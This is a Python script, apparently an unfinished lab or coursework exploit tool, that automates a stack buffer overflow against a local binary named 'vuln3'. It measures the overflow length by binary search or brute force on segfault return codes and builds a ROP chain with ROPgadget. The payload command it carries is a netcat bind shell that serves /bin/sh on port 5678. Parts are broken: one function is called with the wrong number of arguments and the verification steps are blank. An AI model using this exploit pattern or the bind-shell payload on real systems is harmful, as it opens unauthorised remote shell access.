import os
import ROPcompile

BRUTE_FORCE = 0
BINARY_SEARCH = 1
ANALYSIS = 2

COMMAND = "execve(\"/tmp//nc\",\"-lnp\",\"5678\",\"-tte\",\"\bin//sh\", NULL)"
PROGRAM = "vuln3"
FILE_MODE = True

def main():
    program = "./" + PROGRAM
    if FILE_MODE:
        program += " "
    else:
        program += " < "

    #STEP 1 - Buffer Discovery
    bufferLength = bufferDiscovery(BINARY_SEARCH, program)
    print(bufferLength)
    #STEP 2 - Create ROP Chain
    ROPchain = createROPchain(COMMAND)
    #STEP 3a - Verify success with known .data

    #STEP 3b - Verify success with random .data

def bufferDiscovery(mode, program):
    if(mode == BRUTE_FORCE):
        #Do Something
        print("Brute Force")
        return bruteForce(program)
    if(mode == BINARY_SEARCH):
        #Do Something
        print("Binary Search")
        return binarySearch(program)
    if(mode == ANALYSIS):
        #Do Something
        print("Analysis")

def bruteForce(program):
    fileLoc = "payload"
    test = open(fileLoc, "w")
    payload = ""
    for i in range(0, 128):
        payload = 'A' * i
        writePayload(test, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(i) + ", returned code " + str(output))
        if output == 35584:
            return i - 1 + 4
    return -1

def binarySearch(program):
    fileLoc = "payload"
    payload = ""
    found = False
    Low = 1
    High = 1
    output = 0

    #Work Up to find a SEG FAULT
    while output != 35584:
        payload = 'A' * High
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(High) + ", returned code " + str(output))
        High = High * 2
        if(High > 512):
            quit() #Exit out if buffer is very large

    #Work Down to earliest SEG FAULT
    while found == False:
        payload = 'A' * int((High + Low) / 2)
        writePayload(fileLoc, payload)
        output = run(program, fileLoc)
        print("Running program with buffer of " + str(int((High + Low) / 2)) + ", returned code " + str(output))
        if output == 35584:
            High = int((High + Low) / 2)
        if output == 0:
            Low = int((High + Low) / 2)
        if High == Low + 1:
            found = True

    return High + 4


def writePayload(file, string):
    f = open(file, "w")
    f.write(string)

def run(program, payload):
    command = program + payload
    return os.system(command)

def createROPchain(command, bufflength):

    #Find ROP gadgets
    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")

    #Write command as gadgets
    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt")

    #Verify gadgets are present

    #Rewrite for missing gadgets

    #Write the payload
    pfile = open("payload", "w")
    pfile.write(payload)


if __name__ == "__main__":
    main()